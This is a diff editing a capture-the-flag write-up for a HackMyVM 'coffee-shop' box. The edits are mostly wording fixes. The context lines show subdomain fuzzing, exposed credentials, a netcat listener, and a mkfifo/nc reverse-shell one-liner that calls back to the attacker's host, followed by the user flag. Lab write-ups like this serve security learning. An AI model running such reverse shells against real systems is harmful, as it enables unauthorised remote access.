@@ -108,16 +108,15 @@ dev                     [Status: 200, Size: 1738, Words: 575, Lines: 72, Duratio
 :: Progress: [114441/114441] :: Job [1/1] :: 8333 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
 ```
 
-Adding dev to the host file:
+Adding `dev` to the host file:
 
 ```bash
 echo '192.168.0.175 dev.midnight.coffee' | sudo tee -a /etc/hosts
 ```
 
-Navigating to this new sub domain, credentials are displayed:
+Navigating to the new sub domain, credentials are displayed:
 
 ![[Pasted image 20240730180526.png]]
-
 ### Credentials
 
 ```bash
@@ -158,8 +157,7 @@ Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)
   Processes:               132
   Users logged in:         0
   IPv4 address for enp0s3: 192.168.0.175
-  IPv6 address for enp0s3: 2a00:23c6:2989:ca01:a00:27ff:fe2a:fe97
-
+  
 
 Expanded Security Maintenance for Applications is not enabled.
 
@@ -256,7 +254,7 @@ garffff@garffff:~/hackmyvm/coffeeshop$ sudo nc -lvp 9999
 Listening on 0.0.0.0 9999
 ```
 
-Echo the MSFVenom payload to a file in the `/tmp` directory and make it executable:
+Echoing the msfvenom payload to a file in the `/tmp` directory and make it executable:
 
 ```bash
 tuna@coffee-shop:~$ echo 'mkfifo /tmp/kdiw; nc 192.168.0.51 9999 0</tmp/kdiw | /bin/sh >/tmp/kdiw 2>&1; rm /tmp/kdiw' > /tmp/shell.sh
@@ -297,7 +295,7 @@ shopadmin
 uid=1001(shopadmin) gid=1001(shopadmin) groups=1001(shopadmin)
 ```
 
-Grabbing the use flag:
+Grabbing the user flag:
 
 ```bash
 shopadmin@coffee-shop:~$ cat user.txt	
